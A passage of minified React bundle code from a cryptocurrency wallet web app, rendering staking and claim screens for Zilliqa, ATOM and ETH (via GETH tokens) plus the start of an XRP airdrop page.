            be.xG)(d.currency)), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will receive"), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(e.amount, 12), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(d.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: C
            }), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(e.toConvert || E))))), d && e.walletFrom && O.createElement(ConfirmInfoWallet, {
                type: "to",
                wallet: d
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Max Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, !y || _ ? "–" : O.createElement("span", null, y, " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(g.currency))), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: S
            }), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(e.toConvert || E))))), O.createElement("div", {
                className: dM
            }), k && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient funds. The fee is paid from the wallet balance.", " ", O.createElement("a", {
                className: wM,
                onClick: h(d)
            }, "Top up your wallet")), O.createElement(ledger_token_info, {
                parentWallet: g
            }), r && b && O.createElement(ui_message, null, "Please unlock you ", d.hw, ", choose ", (0,
            be.xG)(d.family), " app and then press Confirm."), v && O.createElement(ui_message, {
                type: "error"
            }, "Error calculating fee, please", " ", O.createElement("a", {
                className: vM,
                onClick: w
            }, "try again")), o && O.createElement(bf, {
                error: o
            }), O.createElement("div", {
                className: fM
            }, r && O.createElement("div", {
                className: yM
            }, s && O.createElement("span", null, s)), !r && O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, k ? O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: h(d),
                isLoading: r
            }, "Close") : O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirm,
                isLoading: r
            }, "Confirm")))))
        }
        let lK = !1;
        function StakingZilConfirmClaim() {
            const e = useLocationSearch()
              , t = (0,
            j.k6)()
              , a = (0,
            $.I0)()
              , n = (0,
            $.v9)(eu)
              , [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)("")
              , [o,c] = (0,
            O.useState)(null)
              , {convertToFiat: u} = useConverter()
              , [d,m] = (0,
            O.useState)()
              , [p,f] = (0,
            O.useState)()
              , {localCurrency: E} = local_currency_useLocalCurrency()
              , h = useGoToReceivePage();
            (0,
            O.useEffect)(( () => {
                if (e.walletFrom) {
                    const t = n(e.walletFrom);
                    if (t) {
                        m(t);
                        f(t)
                    }
                }
            }
            ), [e, n]);
            const [g] = fee_wallet(d)
              , [y,v,_,w] = use_fee(d, p, e.reward, {
                totalBalance: d ? d.balance : void 0,
                zilWithdrawStakeRewards: !0
            })
              , setProcess = async e => {
                i(e);
                return new Promise((e => setTimeout(e, 500)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                d && a(updateWalletsBalanceAndTxs(d))
            }
            ), [a, d]);
            (0,
            O.useEffect)(( () => {
                setProcess(_ ? "Loading Fee..." : "")
            }
            ), [_]);
            (0,
            O.useEffect)(( () => {
                if (o) {
                    lK = !1;
                    setProcess("");
                    l(!1)
                }
            }
            ), [o]);
            (0,
            O.useEffect)(( () => {
                s && !r && l(!0);
                if (!s) {
                    lK = !1;
                    l(!1)
                }
            }
            ), [r, s]);
            if (!d || !g || !p)
                return null;
            const b = d.hw || g.hw
              , k = (0,
            Ko.gt)(y, d.balance)
              , S = (0,
            Ko.gt)(y, e.reward)
              , C = u(y || void 0, g)
              , N = u(e.reward, g)
              , handleConfirm = async () => {
                if (lK)
                    return;
                if (k)
                    return;
                const n = cc.$.txPerformanceStart();
                lK = !0;
                c(null);
                await setProcess("Updating wallet balance...");
                await a(updateWalletsBalanceAndTxs(d));
                await setProcess(`Loading ${(0,
                be.xG)(d.currency)} Blockchain adapter...`);
                await setProcess("Preparing transaction...");
                const r = await Se.Z.getApiByWallet(d);
                try {
                    const a = await r.claim({
                        wallet: d,
                        validatorAddress: e.validatorAddress
                    });
                    if (a.error) {
                        c(a.error);
                        return
                    }
                    if (a.hash) {
                        cc.$.send(cc.d.CLAIM_SEND, "zil");
                        const r = cc.$.txPerformanceEnd(n);
                        cc.$.send(cc.d.PERFORMANCE_TX_CLAIM, d.currency, `${r} ms`);
                        t.replace({
                            pathname: (0,
                            M.RU)("/send/success"),
                            search: objectToString({
                                type: "zilClaimTx",
                                amount: e.reward,
                                hash: a.hash,
                                walletFrom: d.uuid,
                                currency: d.currency
                            })
                        })
                    }
                } catch (e) {}
            }
            ;
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, "Fees are charged by the Zilliqa network and depends on how long you have not claimed rewards. All funds that were not used to pay the fee will be returned to the wallet.")), O.createElement("div", {
                className: iM
            }, O.createElement("div", {
                className: uM
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Claim ", (0,
            Ko.yF)(e.reward, 12), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(d.currency)), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will receive"), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(e.reward, 12), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(d.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: N
            }), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(e.toConvert || E))))), d && e.walletFrom && O.createElement(ConfirmInfoWallet, {
                type: "to",
                wallet: d
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Max Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, !y || _ ? "–" : O.createElement("span", null, y, " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(g.currency))), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: C
            }), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(e.toConvert || E))))), O.createElement("div", {
                className: dM
            }), S && !k && O.createElement(ui_message, {
                type: "warning"
            }, "Your reward amount is less than the Max Network Fee amount."), k && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient funds. The fee is paid from the wallet balance.", " ", O.createElement("a", {
                className: wM,
                onClick: h(d)
            }, "Top up your wallet")), O.createElement(ledger_token_info, {
                parentWallet: g
            }), r && b && O.createElement(ui_message, null, "Please unlock you ", d.hw, ", choose ", (0,
            be.xG)(d.family), " app and then press Confirm."), v && O.createElement(ui_message, {
                type: "error"
            }, "Error calculating fee, please", " ", O.createElement("a", {
                className: vM,
                onClick: w
            }, "try again")), o && O.createElement(bf, {
                error: o
            }), O.createElement("div", {
                className: fM
            }, r && O.createElement("div", {
                className: yM
            }, s && O.createElement("span", null, s)), !r && O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, k ? O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: h(d),
                isLoading: r
            }, "Close") : O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirm,
                isLoading: r
            }, "Confirm")))))
        }
        const sK = {
            wrapper: "index_wrapper_3so_k app_wrapperBlock_2EpA3",
            wrapperForm: "index_wrapperForm_19GvW app_wrapperLeftBlock_3QLZp",
            footerBlock: "index_footerBlock_3dZ2z app_footerBlock_n86Kc",
            stepInfo: "index_stepInfo_bmMRb app_stepInfo_2VLE6",
            toggleAdvancedOptions: "index_toggleAdvancedOptions_19hew",
            toggleAdvancedOptionsText: "index_toggleAdvancedOptionsText_2jvUK"
        }
          , AtomStakingPage = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            j.k6)()
              , a = O.createRef()
              , n = (0,
            $.v9)($c)
              , {convertToFiat: r} = useConverter()
              , [l,s] = (0,
            O.useState)(!1)
              , [i,o] = (0,
            O.useState)(!1)
              , [c,u] = (0,
            O.useState)(void 0)
              , {defaultValidator: d, listOfValidators: m, isLoading: p} = bI()
              , {fromWallet: f, setFromWallet: E, amount: h, setAmount: g} = oG({
                ticker: "atom"
            })
              , [y,v] = (0,
            O.useState)({
                uuid: "",
                address: (null == d ? void 0 : d.address) || "",
                currency: "atom"
            })
              , _ = [...n].filter((e => "atom" === e.currency))
              , [w,,,b] = use_fee(f, y, h, {
                totalBalance: f ? f.balance : void 0
            })
              , k = Sc().max(0, (0,
            Ko.h9)((null == f ? void 0 : f.balance) || 0, w)).toString();
            (0,
            O.useEffect)(( () => {
                u(d);
                s(!1)
            }
            ), [d, null == f ? void 0 : f.uuid]);
            const handleSetVisibleOptions = () => {
                s(!l)
            }
              , handleChangeFromWallet = t => {
                if (t) {
                    e(setActiveWallet(t));
                    e(updateWalletsBalanceAndTxs(t, {
                        isCascade: !1
                    }));
                    E(t)
                }
            }
            ;
            function handleSetValidator(e) {
                u(e);
                v({
                    uuid: "",
                    address: e.address,
                    currency: "atom"
                });
                b()
            }
            function handleChangeAmount(e) {
                let {target: {value: t}} = e;
                const a = (0,
                Ko.y4)(t);
                g(a)
            }
            (0,
            O.useEffect)(( () => {
                i && o(!1)
            }
            ), [f]);
            const handleNext = () => {
                const {isValid: e} = a.current.validate();
                if (!e || !f || !c) {
                    o(!0);
                    return
                }
                const n = (null == c ? void 0 : c.address) === (null == d ? void 0 : d.address)
                  , l = {
                    amount: h || "",
                    walletFrom: (null == f ? void 0 : f.uuid) || "",
                    validatorAddress: (null == c ? void 0 : c.address) || "",
                    validatorRate: (null == c ? void 0 : c.rate) || "",
                    validatorTitle: (null == c ? void 0 : c.title) || ""
                };
                n && Object.assign(l, {
                    isValidatorEverstake: n
                });
                const s = (0,
                Ko.FH)(r(h, f, "usd"), {
                    max: 4
                });
                s && Object.assign(l, {
                    amountInUsd: s
                });
                const i = new URLSearchParams(l);
                t.push({
                    pathname: (0,
                    M.RU)("/staking-atom/staking/confirm"),
                    search: i.toString()
                })
            }
              , S = {
                precision: 18,
                min: "0",
                max: (0,
                Ko.FH)(k, {
                    max: 6
                }),
                available: k
            }
              , C = O.memo(( () => O.createElement(panel_right_image, {
                src: mD
            }, "Delegate your tokens to validators and earn staking rewards. The validator choice can be based on their Power (the share of ATOM coins delegated to a particular validator) and Fee (sum charged before distributing the reward to delegators). Please note that your deposit will be frozen for 21 days after withdrawal.")));
            return O.createElement(sG, {
                wallet: f,
                styles: sK,
                RightBlockContent: C
            }, O.createElement(sf(), {
                ref: a
            }, O.createElement(label, null, "From"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: f
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && i,
                    message: a
                }, O.createElement(Mh, {
                    selectedWallet: f,
                    wallets: _,
                    onChange: handleChangeFromWallet,
                    withoutWatchOnly: !0,
                    customFilter: e => onCustomFilterWallets(e, ["atom"]),
                    stakingCurrency: "ATOM"
                }))
            }
            )), O.createElement(label, null, "Deposit Amount"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: h,
                rules: zf.amount(S)
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && i,
                    message: a
                }, O.createElement(Ea, {
                    autoFocus: !0,
                    name: "lastpass-fix-search",
                    onChange: handleChangeAmount,
                    value: h,
                    placeholder: "0"
                }))
            }
            ))), O.createElement(AvailableForStaking, {
                currency: (null == f ? void 0 : f.currency) || "bnb",
                maxAmount: k,
                setAmount: g
            }), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Validator:"), O.createElement(MiskInfoValue, null, null == c ? void 0 : c.title, " (", null == c ? void 0 : c.subtitle, ")")), !l && O.createElement("div", {
                className: sK.toggleAdvancedOptions
            }, O.createElement("span", {
                onClick: handleSetVisibleOptions,
                className: "dashedNormal"
            }, "Advanced options")), l && O.createElement(O.Fragment, null, O.createElement("div", {
                className: sK.toggleAdvancedOptions
            }, O.createElement("span", {
                onClick: handleSetVisibleOptions,
                className: "dashedNormal"
            }, "Hide advanced options")), O.createElement(label, null, "To"), O.createElement(lf.ValidatorField, {
                rules: zf.xtzValidator,
                value: c
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && i,
                    message: a
                }, O.createElement(Lp, {
                    selected: c,
                    isLoading: p,
                    items: m,
                    placeholder: "Select Validator",
                    emptyPlaceholder: "Validators not found",
                    onChange: handleSetValidator
                }))
            }
            )), O.createElement(ui_message, {
                type: "warning"
            }, "We cannot guarantee the stability of a third-party validator. Please do your own research to assess risks.")), O.createElement("div", {
                className: sK.footerBlock
            }, O.createElement("div", {
                className: sK.stepInfo
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next"))))
        }
          , iK = AtomStakingPage
          , AtomStakeConfirm = () => {
            const {validatorAddress: e} = oG({
                ticker: "atom"
            });
            return O.createElement(StakeConfirm_StakeConfirm, {
                customAdditionalSend: {
                    typeOperation: "side_delegate",
                    validatorAddress: e
                }
            })
        }
          , oK = "Attention! Your deposit will remain frozen for 21 days after unstaking."
          , AtomUnstakeConfirm = () => {
            const {validatorAddress: e} = oG({
                ticker: "atom"
            });
            return O.createElement(UnstakeConfirm_UnstakeConfirm, {
                rightBlockText: oK,
                customAdditionalSend: {
                    typeOperation: "side_undelegate",
                    validatorAddress: e
                }
            })
        }
          , AtomClaimConfirm = () => {
            const e = useLocationSearch()
              , t = (0,
            $.I0)()
              , a = (0,
            $.v9)(eu)
              , n = (0,
            $.v9)(ax)
              , [r,l] = (0,
            O.useState)()
              , [s,i] = (0,
            O.useState)([])
              , [o,c] = (0,
            O.useState)(e.amount || "")
              , u = (0,
            O.useMemo)(( () => ({
                poolsToWithdraw: s
            })), [s]);
            (0,
            O.useEffect)(( () => {
                const t = a(e.walletFrom);
                t && l(t)
            }
            ), [e.walletFrom, a]);
            (0,
            O.useEffect)(( () => {
                !n && r && t(lb.fetchActiveStakingInfoByWallet({
                    wallet: r
                }));
                if (n && "STAKING_INFO_SUCCESS" === n.fetchStatus) {
                    c(n.dto.totalRewardsInUatom);
                    i(n.dto.mappedRewardsInUatom)
                }
            }
            ), [n, t, r]);
            (0,
            O.useEffect)(( () => () => {
                t(lb.setActiveStaking({
                    wallet: void 0
                }))
            }
            ), []);
            return O.createElement(ClaimConfirm_ClaimConfirm, {
                amountForFee: o,
                customAdditionalSend: u,
                customCondition: !s || 0 === s.length
            })
        }
          , cK = {
            wrapper: "index_wrapper_ZGdba app_wrapperBlock_2EpA3",
            wrapperForm: "index_wrapperForm_PCmZb app_wrapperLeftBlock_3QLZp",
            footerBlock: "index_footerBlock_3pu8u app_footerBlock_n86Kc",
            stepInfo: "index_stepInfo_1vHyF app_stepInfo_2VLE6",
            toggleAdvancedOptions: "index_toggleAdvancedOptions_1Z6lf",
            messageList: "index_messageList_1lhzQ"
        }
          , uK = .1;
        function StakingEthIndex() {
            const e = (0,
            $.I0)()
              , t = O.createRef()
              , a = (0,
            $.v9)($c)
              , n = (0,
            j.k6)()
              , {convertToFiat: r} = useConverter()
              , l = usePopup()
              , [s,i] = (0,
            O.useState)(!1)
              , {fromWallet: o, setFromWallet: c, amount: u, setAmount: d, initialAmount: m} = oG({
                ticker: "eth"
            })
              , [p,f] = (0,
            O.useState)(null)
              , [E,h] = (0,
            O.useState)(null)
              , [g] = use_fee(o, o, u)
              , y = [...a].filter((e => ("eth" === e.currency || "ropsten" === e.currency && M.CM) && !e.watchOnly))
              , v = (0,
            O.useMemo)(( () => {
                if (void 0 === o || null === g)
                    return "0";
                const e = 18
                  , t = Sc().max(0, (0,
                Ko.h9)(o.balance, g || "0").toString()).toString();
                return (0,
                Ko.FH)(t, {
                    roundDown: !0,
                    max: e
                })
            }
            ), [null == o ? void 0 : o.balance, g]);
            (0,
            O.useEffect)(( () => {
                E !== (0 === y.length) && h(0 === y.length);
                const e = y.filter((e => (0,
                Ko.eg)(e.balance, uK)))
                  , t = e.length > 0;
                t !== p && f(t)
            }
            ), [y]);
            const handleChangeFromWallet = t => {
                e(updateWalletsBalanceAndTxs(t, {
                    isCascade: !0
                }));
                c(t)
            }
            ;
            (0,
            O.useEffect)(( () => {
                s && i(!1)
            }
            ), [o]);
            (0,
            O.useEffect)(( () => {
                m && d(m)
            }
            ), [m]);
            function onCreateClick(e) {
                e.stopPropagation();
                e.preventDefault();
                l.open("import-or-create", {
                    initialTab: "create",
                    currency: "eth"
                })
            }
            function onImportClick(e) {
                e.stopPropagation();
                e.preventDefault();
                l.open("import-or-create", {
                    initialTab: "import",
                    currency: "eth"
                })
            }
            function onExchangeClick(e) {
                e.stopPropagation();
                e.preventDefault();
                n.push({
                    pathname: (0,
                    M.RU)("/exchange"),
                    search: objectToString({
                        amount: uK
                    })
                })
            }
            function onBuyClick(e) {
                e.stopPropagation();
                e.preventDefault();
                n.push({
                    pathname: (0,
                    M.RU)("/buy"),
                    search: objectToString({
                        walletTo: null == o ? void 0 : o.uuid
                    })
                })
            }
            const handleNext = async () => {
                var e, a;
                const {isValid: l} = null !== (e = null === (a = t.current) || void 0 === a ? void 0 : a.validate()) && void 0 !== e ? e : {};
                if (!l) {
                    i(!0);
                    return
                }
                const s = {
                    walletFrom: null == o ? void 0 : o.uuid,
                    amount: u
                }
                  , c = (0,
                Ko.FH)(r(u, null != o ? o : void 0, "usd"), {
                    max: 4
                });
                c && Object.assign(s, {
                    amountInUsd: c
                });
                n.push({
                    pathname: (0,
                    M.RU)("/staking-eth/confirm"),
                    search: objectToString(s)
                })
            }
              , _ = {
                precision: "18",
                min: uK,
                max: (0,
                Ko.FH)(v, {
                    max: 18
                }),
                available: v
            };
            function getNotificationData() {
                return E ? O.createElement(ui_message, {
                    type: "info"
                }, O.createElement("span", null, "You need an Ethereum wallet with balance more than 0.1 ETH to stake it. You have 2 options: ", O.createElement("br", null), "1. You can ", O.createElement("a", {
                    onClick: onCreateClick
                }, "create"), " a new ETH wallet and top it up;", O.createElement("br", null), "2. You can ", O.createElement("a", {
                    onClick: onImportClick
                }, "import"), " an existing wallet.", O.createElement("br", null))) : o && (0,
                Ko.G)(o.balance, uK) && p ? O.createElement(ui_message, {
                    type: "info"
                }, O.createElement("span", null, "Please, choose a wallet with balance more than 0.1 ETH.")) : o && (0,
                Ko.G)(o.balance, uK) && !p ? O.createElement(ui_message, {
                    type: "info"
                }, O.createElement("span", null, "To stake ETH you need to top up your wallet. You have 3 options: ", O.createElement("br", null), "1. You can ", O.createElement("a", {
                    onClick: onBuyClick
                }, "buy"), " ETH with credit card;", O.createElement("br", null), "2. You can ", O.createElement("a", {
                    onClick: onImportClick
                }, "import"), " an existing wallet;", O.createElement("br", null), "3. You can ", O.createElement("a", {
                    onClick: onExchangeClick
                }, "exchange"), " another crypto for ETH.")) : o ? O.createElement(ui_message, {
                    type: "info"
                }, O.createElement("div", null, "Notes:"), O.createElement("ul", {
                    className: cK.messageList
                }, O.createElement("li", null, "Exchange your ETH for GETH to participate in staking."), O.createElement("li", null, "Earn rewards for holding GETH at an annual yield of 2.0–2.5% APY. Rewards are distributed quarterly and credited to your GETH address."), O.createElement("li", null, "To exit staking, exchange your GETH back to ETH. This is the only way to cancel staking."))) : null
            }
            function handleChangeAmount(e) {
                let {target: {value: t}} = e;
                const a = (0,
                Ko.y4)(t);
                d(a)
            }
            const w = O.memo(( () => O.createElement(panel_right_image, {
                src: mD
            }, "To participate in staking and earn rewards, you must hold at least 0.1 GETH in your wallet. ETH can be withdrawn from staking by exchanging GETH for ETH at a 1:1 ratio.")));
            return o ? O.createElement(sG, {
                wallet: null != o ? o : void 0,
                styles: cK,
                RightBlockContent: w
            }, getNotificationData(), O.createElement(sf(), {
                ref: t
            }, O.createElement(label, null, "From"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: o
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && s,
                    message: a
                }, O.createElement(Mh, {
                    selectedWallet: o,
                    wallets: y,
                    onChange: handleChangeFromWallet,
                    withoutWatchOnly: !0,
                    withoutSubwallets: !0,
                    customFilter: e => onCustomFilterWallets(e, ["eth", "ropsten"]),
                    stakingCurrency: "ETH"
                }))
            }
            )), O.createElement(label, null, "Deposit Amount"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: u,
                rules: [...zf.ethMinimumAmount(_), ...zf.amount(_)]
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && s,
                    message: a
                }, O.createElement(Ea, {
                    autoFocus: !0,
                    name: "lastpass-fix-search",
                    onChange: handleChangeAmount,
                    value: u,
                    placeholder: "0"
                }))
            }
            ))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Min Delegation Amount:"), O.createElement(MiskInfoValue, {
                onClick: () => d(uK.toString())
            }, uK, " ", (0,
            be.xG)(null == o ? void 0 : o.currency))), O.createElement(AvailableForStaking, {
                currency: o.currency,
                maxAmount: v,
                setAmount: d
            }), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Network Fee:"), O.createElement(MiskInfoValue, {
                disabled: !g
            }, g, " ", (0,
            be.xG)(null == o ? void 0 : o.currency))), O.createElement("div", {
                className: cK.footerBlock
            }, O.createElement("div", {
                className: cK.stepInfo
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next")))) : null
        }
        const dK = 2e5
          , mK = "0x3802c218221390025bceabbad5d8c59f40eb74b8"
          , StakingEthConfirmIndex = () => {
            const e = useLocationSearch()
              , t = (0,
            j.k6)()
              , a = (0,
            j.TH)()
              , n = (0,
            $.I0)()
              , r = (0,
            $.v9)(eu)
              , [l,s] = (0,
            O.useState)(!1)
              , [i,o] = (0,
            O.useState)(void 0)
              , {convertToFiat: c} = useConverter()
              , [u,d] = (0,
            O.useState)(!1)
              , m = r(e.walletFrom)
              , [p,,f] = use_fee(m, m, e.amount, {
                gasPrice: Number(e.gasPrice),
                gasLimit: dK
            })
              , {localCurrency: E} = local_currency_useLocalCurrency();
            (0,
            O.useEffect)((function fetchTotalGethBalance() {
                n(Fu.fetchTotalGethBalance())
            }
            ), [n]);
            const [h] = fee_wallet(m)
              , setProcess = async e => {
                o(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                m && n(updateWalletsBalanceAndTxs(m, {
                    isCascade: !0
                }))
            }
            ), [n, m]);
            (0,
            O.useEffect)(( () => {
                i && !l && s(!0);
                i || s(!1)
            }
            ), [l, i]);
            (0,
            O.useEffect)(( () => {
                setProcess(f ? "Loading Fee..." : void 0)
            }
            ), [f]);
            const handleUpdateBalance = e => async () => {
                if (e) {
                    setProcess("Updating wallet balance...");
                    await n(updateWalletsBalanceAndTxs(e, {
                        isCascade: !0
                    }));
                    setProcess(void 0)
                }
            }
              , handleBack = () => {
                t.replace({
                    pathname: (0,
                    M.RU)("/staking-eth"),
                    search: a.search
                })
            }
            ;
            if (!m || !h)
                return null;
            const g = m.hw || h.hw
              , y = (0,
            Ko.gt)(e.amount, m.balance)
              , v = c(e.amount, m)
              , _ = (0,
            Ko.h9)(e.amount, 0)
              , findGethWallet = () => {
                var e;
                return null == m || null === (e = m.subWallets) || void 0 === e ? void 0 : e.find((e => {
                    var t;
                    return (null == e || null === (t = e.smartContract) || void 0 === t ? void 0 : t.toLocaleLowerCase()) === mK.toLocaleLowerCase()
                }
                ))
            }
              , handleConfirm = async () => {
                d(!1);
                let a = findGethWallet();
                if (!a) {
                    await n(rd.createWallet({
                        currency: "geth",
                        smartContract: mK,
                        isCoin: !1,
                        parentWallet: m,
                        downloadType: Sm.AFTER_CREATE_WALLET
                    }));
                    a = await new Promise((e => {
                        const checkWallet = async function() {
                            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0;
                            const a = findGethWallet();
                            a || t >= 40 ? e(a) : setTimeout(( () => checkWallet(t + 1)), 250)
                        };
                        checkWallet()
                    }
                    ))
                }
                if (!a) {
                    var r;
                    d(!0);
                    ge.b.error(ge.d.FAILED_TO_CREATE_GETH, {
                        uuid: null == m ? void 0 : m.uuid,
                        subWallets: null == m || null === (r = m.subWallets) || void 0 === r ? void 0 : r.map((e => e.uuid))
                    });
                    throw new Error("Failed to create GETH wallet")
                }
                const l = new URLSearchParams({
                    amount: e.amount || "",
                    walletFrom: m.uuid || "",
                    walletTo: a.uuid
                });
                t.replace({
                    pathname: (0,
                    M.RU)("/exchange"),
                    search: l.toString()
                })
            }
            ;
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, "The benefit of tokenised staking is that you will be able to withdraw your deposit and rewards in GETH tokens long before the ETH 2.0 chain launch.")), O.createElement("div", {
                className: iM
            }, O.createElement("div", {
                className: uM
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Stake ", (0,
            Ko.yF)(e.amount), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(m.currency)), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will stake", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(e.amount), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(m.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: v,
                renderCurrency: !0
            })))), m && e.walletFrom && O.createElement(ConfirmInfoWallet, {
                type: "from",
                wallet: m
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, p, " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(null == m ? void 0 : m.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: c(p || void 0, m)
            }), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(e.toConvert || E))))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Will be deposited"), O.createElement(ConfirmInfoValue, null, (0,
            Ko.G)(_, 0) ? "0" : (0,
            Ko.yF)(_), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(m.currency)))), O.createElement("div", {
                className: dM
            }), !l && (y || (0,
            Ko.G)(_, 0)) && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ", (0,
            be.xG)(m.currency), " Balance. Available balance: ", m.balance, " ", (0,
            be.xG)(m.currency), O.createElement("br", null), O.createElement("a", {
                className: vM,
                onClick: handleUpdateBalance(m)
            }, "Update wallet balance")), O.createElement(ledger_token_info, {
                parentWallet: h
            }), l && g && O.createElement(ui_message, null, "Please unlock you ", m.hw, ", choose ", (0,
            be.xG)(m.family), " app and then press Confirm."), O.createElement(ui_message, {
                type: "info"
            }, "Please note you will be redirected to the Exchange page, and you will receive GETH in exchange for ETH. You will be able to exchange GETH back to ETH in a 1-to-1 ratio afterwards (network fee excluded ). On this page you will see the exact amount of GETH that you’ll receive after fee deduction"), u ? O.createElement(ui_message, {
                type: "error"
            }, "Failed to create GETH wallet. Please try again.") : null, O.createElement("div", {
                className: fM
            }, l && O.createElement("div", {
                className: yM
            }, i && O.createElement("span", null, i)), !l && O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, !l && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                id: "stakingEthConfirm",
                color: "blue",
                size: "big",
                onClick: handleConfirm,
                isLoading: l
            }, "Go To Exchange")))), O.createElement("input", {
                id: "stakingAmountInUsd",
                type: "hidden",
                name: "amountInUsd",
                value: e.amountInUsd
            }))
        }
          , pK = StakingEthConfirmIndex
          , fK = {
            wrapper: "index_wrapper_2XaXK app_wrapperBlock_2EpA3",
            wrapperForm: "index_wrapperForm_9dE7s app_wrapperLeftBlock_3QLZp",
            footerBlock: "index_footerBlock_xGCS- app_footerBlock_n86Kc",
            stepInfo: "index_stepInfo_1zUA_ app_stepInfo_2VLE6",
            inputWrapper: "index_inputWrapper_2WbW_",
            loaderWrapper: "index_loaderWrapper_3k-z9",
            misk: "index_misk_2yNXn",
            feeWrapper: "index_feeWrapper_3Wf8d",
            toggleAdvancedOptions: "index_toggleAdvancedOptions_1pUd0"
        }
          , airdrop_spark_xrp_use_use_initial_params = () => {
            const e = useLocationSearch()
              , t = (0,
            $.v9)(eu)
              , a = (0,
            $.v9)($c)
              , [n,r] = (0,
            O.useState)(!1)
              , [l,s] = (0,
            O.useState)(null);
            (0,
            O.useEffect)(( () => {
                let l;
                if (e.walletFrom && !n && a.length) {
                    l = t(e.walletFrom);
                    l && s(l);
                    r(!0)
                }
            }
            ), [a]);
            (0,
            O.useEffect)(( () => {
                if (a.length && n) {
                    const a = t(e.walletFrom);
                    a && s(a)
                }
            }
            ), [a, e]);
            return [l, s]
        }
        ;
        let EK = !1;
        function BoardXrpSparkAirdropPage() {
            const e = (0,
            $.I0)()
              , t = O.createRef()
              , a = (0,
            $.v9)($c)
              , n = (0,
            j.k6)()
              , [r,l] = (0,
